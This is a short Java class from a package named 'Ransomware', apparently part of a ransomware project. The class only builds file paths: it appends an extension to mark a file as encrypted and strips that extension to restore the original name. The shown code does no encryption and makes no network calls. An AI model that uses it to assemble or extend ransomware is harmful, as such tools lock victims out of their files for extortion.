package Ransomware;

import java.io.File;

public class GeneratorFilePath {
    private final String ext;

    public GeneratorFilePath(String ext){
        this.ext = ext;
    }
    public String getEncryptedFilePath(File file){
        return file.getPath() + "." + ext;
    }
    public String getDecrypted(File file){
        String filePath = file.getPath();
        return filePath.substring(0,filePath.lastIndexOf(ext) - 1);
    }
}
